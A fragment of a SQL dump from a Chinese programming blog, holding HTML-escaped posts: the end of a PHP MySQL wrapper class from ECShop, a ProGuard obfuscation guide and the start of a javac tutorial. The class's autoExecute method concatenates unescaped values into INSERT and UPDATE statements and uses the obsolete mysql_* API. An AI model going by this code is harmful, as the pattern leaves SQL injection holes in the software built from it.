mysql_free_result($query);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回上一步INSERT查询中产生的AUTO_INCREMENT的ID号</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function insert_id()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_insert_id($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//从结果集中取得一行作为关联数组</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function fetchRow($query)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_fetch_assoc($query);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//从结果集中取得列信息并作为对象返回</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function fetch_fields($query)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_fetch_field($query);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回mysql版本信息</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function version()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $this-&gt;version;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//自动重新连接数据库</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function ping()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (PHP_VERSION &gt;= &#39;4.3&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_ping($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//转义SQL语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function escape_string($unescaped_string)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (PHP_VERSION &gt;= &#39;4.3&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_real_escape_string($unescaped_string);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_escape_string($unescaped_string);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//关闭数据库连接</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function close()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_close($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//显示错误信息</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function ErrorMsg($message = &#39;&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($message)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo &quot;&lt;b&gt;ECSHOP info&lt;/b&gt;: $message\\n\\n&lt;br /&gt;&lt;br /&gt;&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo &quot;&lt;b&gt;MySQL server error report:&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print_r($this-&gt;error_message);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/* 仿真 Adodb 函数 */</p>\r\n\r\n<p>//在SQL语句后加上limit</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function selectLimit($sql, $num, $start = 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($start == 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql .= &#39; LIMIT &#39; . $num;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql .= &#39; LIMIT &#39; . $start . &#39;, &#39; . $num;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $this-&gt;query($sql);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回结果集中第一行第一列的数据</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function getOne($sql, $limited = false)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($limited == true)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = trim($sql . &#39; LIMIT 1&#39;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $res = $this-&gt;query($sql);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($res !== false)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $row = mysql_fetch_row($res);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($row !== false)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $row[0];</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return &#39;&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回整个结果集</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function getAll($sql)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $res = $this-&gt;query($sql);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($res !== false)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $arr = array();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while ($row = mysql_fetch_assoc($res))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $arr[] = $row;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $arr;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回结果集中第一行的数据</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function getRow($sql, $limited = false)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($limited == true)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = trim($sql . &#39; LIMIT 1&#39;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $res = $this-&gt;query($sql);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($res !== false)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_fetch_assoc($res);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回结果集中第一列的数据</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function getCol($sql)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $res = $this-&gt;query($sql);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($res !== false)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $arr = array();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while ($row = mysql_fetch_row($res))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $arr[] = $row[0];</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $arr;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//用来执行insert或update语句</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function autoExecute($table, $field_values, $mode = &#39;INSERT&#39;, $where = &#39;&#39;, $querymode = &#39;&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>//获取表中所有列的名称</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $field_names = $this-&gt;getCol(&#39;DESC &#39; . $table);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = &#39;&#39;;</p>\r\n\r\n<p>//如果执行insert语句</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($mode == &#39;INSERT&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $fields = $values = array();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach ($field_names AS $value)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (array_key_exists($value, $field_values) == true)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $fields[] = $value;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $values[] = &quot;&#39;&quot; . $field_values[$value] . &quot;&#39;&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!empty($fields))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = &#39;INSERT INTO &#39; . $table . &#39; (&#39; . implode(&#39;, &#39;, $fields) . &#39;) VALUES (&#39; . implode(&#39;, &#39;, $values) . &#39;)&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>//不是执行insert语句，执行update语句</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sets = array();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach ($field_names AS $value)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (array_key_exists($value, $field_values) == true)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sets[] = $value . &quot; = &#39;&quot; . $field_values[$value] . &quot;&#39;&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!empty($sets))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = &#39;UPDATE &#39; . $table . &#39; SET &#39; . implode(&#39;, &#39;, $sets) . &#39; WHERE &#39; . $where;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//开始执行语句</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($sql)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $this-&gt;query($sql, $querymode);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>?&gt;</p>\r\n',0,1437806212,0,0),(56,34,'ProGuard使用简介','<p>作 者：隔壁老王 http://wallimn.iteye.com，转载请保留本人信息。<br />\r\n本文地址：http://wallimn.iteye.com/blog/558978</p>\r\n\r\n<p>去官方网站下载，解压后，得到的lib包里有三个jar包文件，其中一个proguardgui.jar，是图形界面程序。<br />\r\n运行方法：在同样的目录中，建一个批处理文件（bat文件），内容就一句：java -jar proguardgui.jar，保存文件，双击鼠标运行这个文件，图形界面就出现了。<br />\r\n在图形界面中，只需简单的设置，就可以完成混淆的任务。</p>\r\n\r\n<p>1.在&quot;Input/Output&quot;页签中，设置好要混淆的jar包，设置好混淆结果包的名字，指定好编译这个包需要的jar包，注意，jar包不要同意包含接口jar包及接口的实现jar包，Proguard会个定义重复的错。<br />\r\n2.在&quot;Shriking&quot;页签中，选择一个Keep的类型，如果是WEB工程，就选Library，应用程序就选Application，等。<br />\r\n3.&quot;Obfuscation&quot;、&quot;Optimization&quot;页签中都选默认就可以了。有特殊要求，可以仔细研究一下文档。如果混淆结果使用程序功能不太正常，可以把Optimize选项关闭。反正我们最关心的是混淆，优化不优化无所谓。<br />\r\n4.&quot;Information&quot;页签中，有个Ignore warnings about possibly erronous input，如果混淆的时候，因为警告无法继续，可以把这个选项勾上。其它的选默认就可以了。<br />\r\n5.&quot;Process&quot;页签中，点&quot;Process!&quot;按钮进行混淆。也可以点&quot;Save configuration...&quot;按钮，保存配置文件。</p>\r\n\r\n<p>混淆结果还不错，可以使用jd等反编译工具检查一下，效果确实不错。</p>\r\n',0,1437806430,0,0),(57,16,'如何用javac 和java 编译运行整个Java工程','<p>前言：本文教你怎么用javac和java命令，以及如何利用脚本（shell或bat）方便处理，并用简单的实例展示这些用法。</p>\r\n\r\n<p>IDE是把双刃剑，它可以什么都帮你做了，你只要敲几行代码，点几下鼠标，程序就跑起来了，用起来相当方便。你不用去关心它后面做了些什么，执 行了哪些命令，基于什么原理。然而也是这种过分的依赖往往让人散失了最基本的技能，当到了一个没有IDE的地方，你便觉得无从下手，给你个代码都不知道怎 